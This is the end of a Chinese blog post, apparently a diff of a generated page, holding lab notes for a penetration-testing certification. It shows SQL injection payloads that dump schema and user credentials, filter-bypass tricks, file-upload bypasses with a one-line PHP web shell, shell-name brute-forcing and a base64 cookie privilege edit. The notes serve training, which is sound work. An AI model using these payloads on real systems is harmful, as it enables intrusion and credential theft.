+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="12-16-2"><a href="#12-16-2" class="headerlink" title="12.16"></a>12.16</h3><p>过滤了注释符</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216231442543.png" alt="image-20211216231442543"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216231500469.png" alt="image-20211216231500469"></p>
+<p>绕过方式-#-就变成了–</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232120351.png" alt="image-20211216232120351"></p>
+<p>文章列表效果</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232144069.png" alt="image-20211216232144069"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#39;,database(),&#39;cc&#39;)-#- +         &#x2F;&#x2F;cc是对应的用户名</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232333273.png" alt="image-20211216232333273"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216232349579.png" alt="image-20211216232349579"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zz&#39;,(select group_concat(schema_name) from information_schema.schemata),&#39;cc&#39;)-#- + &#x2F;&#x2F;查询所有库名</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216233039048.png" alt="image-20211216233039048"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z2&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;2web&quot;),&#39;cc&#39;)-#- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216233706223.png" alt="image-20211216233706223"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216233721138.png" alt="image-20211216233721138"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z3&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users1&quot;),&#39;cc&#39;)-#- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234348598.png" alt="image-20211216234348598"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234401233.png" alt="image-20211216234401233"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z4&#39;,(select concat(username,password) from users1 limit 0,1),&#39;cc&#39;)-#- +</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234533676.png" alt="image-20211216234533676"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216234545499.png" alt="image-20211216234545499"></p>
+<h3 id="12-17-4"><a href="#12-17-4" class="headerlink" title="12.17"></a>12.17</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了空格，尝试用&#x2F;**&#x2F;,0x0a,0x0b,0x0c,0x0d,()绕过，发现0x0b绕过</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170508907.png" alt="image-20211217170508907"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170545321.png" alt="image-20211217170545321"></p>
+<h3 id="12-17-5"><a href="#12-17-5" class="headerlink" title="12.17"></a>12.17</h3><p>真的难，id是base64加密，这很容易发现，关键是不知道哪些字符是被过滤的，下图显示的是不加密的数据。</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172709310.png" alt="image-20211217172709310"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172734526.png" alt="image-20211217172734526"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172758818.png" alt="image-20211217172758818"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172826891.png" alt="image-20211217172826891"></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="12-16-3"><a href="#12-16-3" class="headerlink" title="12.16"></a>12.16</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">后缀名		&#x2F;&#x2F;大小写，php345,00截断，htaccess,.user.ini</span><br><span class="line">content-type	</span><br><span class="line">文件头		&#x2F;&#x2F;GIF89a</span><br><span class="line">文件内容关键字检查		&#x2F;&#x2F; &lt;?php $_REQUEST[1]($_REQUEST[2]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235028920.png" alt="image-20211216235028920"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235040145.png" alt="image-20211216235040145"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235114127.png" alt="image-20211216235114127"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211216235137544.png" alt="image-20211216235137544"></p>
+<h3 id="12-17-6"><a href="#12-17-6" class="headerlink" title="12.17"></a>12.17</h3><p>未发现新点</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170821160.png" alt="image-20211217170821160"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217170841548.png" alt="image-20211217170841548"></p>
+<h3 id="12-17-7"><a href="#12-17-7" class="headerlink" title="12.17"></a>12.17</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171556631.png" alt="image-20211217171556631"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename &#x3D; $files[&quot;name&quot;];</span><br><span class="line">$randnum &#x3D; rand(1, 99999);</span><br><span class="line">$fullpath &#x3D; &#39;&#x2F;&#39; . md5($filename.$randnum).&quot;.&quot;.substr($filename,strripos($filename,&#39;.&#39;) + 1);	&#x2F;&#x2F;shell名为md5(文件全名+rand(1,99999)).php,后半段.substr($filename,strripos($filename,&#39;.&#39;) + 1)总是返回后缀名</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171641792.png" alt="image-20211217171641792"></p>
+<p>生成字典</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217171941519.png" alt="image-20211217171941519"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172000987.png" alt="image-20211217172000987"></p>
+<p>爆破</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172022858.png" alt="image-20211217172022858"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217172106460.png" alt="image-20211217172106460"></p>
+<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="12-16-4"><a href="#12-16-4" class="headerlink" title="12.16"></a>12.16</h3><p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000009524.png" alt="image-20211217000009524"></p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000046096.png" alt="image-20211217000046096"></p>
+<p>false改true，Username的base64解密是guest，改admin即可</p>
+<p><img src="/../../../../images/pts%E5%AD%A6%E4%B9%A0/image-20211217000209761.png" alt="image-20211217000209761"></p>
+<h3 id="12-17-8"><a href="#12-17-8" class="headerlink" title="12.17"></a>12.17</h3><p>和12.16一样</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E8%80%83%E8%AF%81/" rel="tag"># 考证</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/14/%E5%85%8D%E6%9D%80%E5%92%8C%E5%8E%BB%E9%BB%91%E7%AA%97/" rel="prev" title="免杀&去黑窗">
+      <i class="fa fa-chevron-left"></i> 免杀&去黑窗
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-15"><span class="nav-number">1.1.</span> <span class="nav-text">12.15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-16"><span class="nav-number">1.2.</span> <span class="nav-text">12.16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-17"><span class="nav-number">1.3.</span> <span class="nav-text">12.17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-17-1"><span class="nav-number">1.4.</span> <span class="nav-text">12.17</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-15-1"><span class="nav-number">2.1.</span> <span class="nav-text">12.15</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-17-2"><span class="nav-number">2.2.</span> <span class="nav-text">12.17</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">3.</span> <span class="nav-text">日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-15-2"><span class="nav-number">3.1.</span> <span class="nav-text">12.15</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-number">4.</span> <span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-14"><span class="nav-number">4.1.</span> <span class="nav-text">12.14</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-16-1"><span class="nav-number">4.2.</span> <span class="nav-text">12.16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-17-3"><span class="nav-number">4.3.</span> <span class="nav-text">12.17</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-16-2"><span class="nav-number">5.1.</span> <span class="nav-text">12.16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-17-4"><span class="nav-number">5.2.</span> <span class="nav-text">12.17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-17-5"><span class="nav-number">5.3.</span> <span class="nav-text">12.17</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">6.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-16-3"><span class="nav-number">6.1.</span> <span class="nav-text">12.16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-17-6"><span class="nav-number">6.2.</span> <span class="nav-text">12.17</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-17-7"><span class="nav-number">6.3.</span> <span class="nav-text">12.17</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="nav-number">7.</span> <span class="nav-text">逻辑漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#12-16-4"><span class="nav-number">7.1.</span> <span class="nav-text">12.16</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#12-17-8"><span class="nav-number">7.2.</span> <span class="nav-text">12.17</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="thedog"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">thedog</p>
+  <div class="site-description" itemprop="description">笑一个</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://steamcommunity.com/profiles/76561198347024263/" title="steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;profiles&#x2F;76561198347024263&#x2F;" rel="noopener" target="_blank"><i class="fab fa-steam fa-fw"></i>steam</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+
+<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
+<div class="widget-wrap">
+    <div id="myCanvasContainer" class="widget tagcloud">
+        <canvas width="250" height="250" id="resCanvas" style="width=100%">
+            <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve-2020-1472/" rel="tag">cve-2020-1472</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/" rel="tag">上线方式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8F%90%E6%9D%83/" rel="tag">提权</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%91%84%E5%83%8F%E5%A4%B4/" rel="tag">摄像头</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A1%AC%E4%BB%B6/" rel="tag">硬件</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%92%93%E9%B1%BC/" rel="tag">钓鱼</a><span class="tag-list-count">1</span></li></ul>
+        </canvas>
+    </div>
+</div>
+
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">thedog</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'Q9yIHCeu9YgeOBK4PDlf45fD-gzGzoHsz',
+      appKey     : 'Ny4HdnMmkjlvgFBeGiA6Hgor',
+      placeholder: "吱一声",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+    </div>
+</body>
+</html>
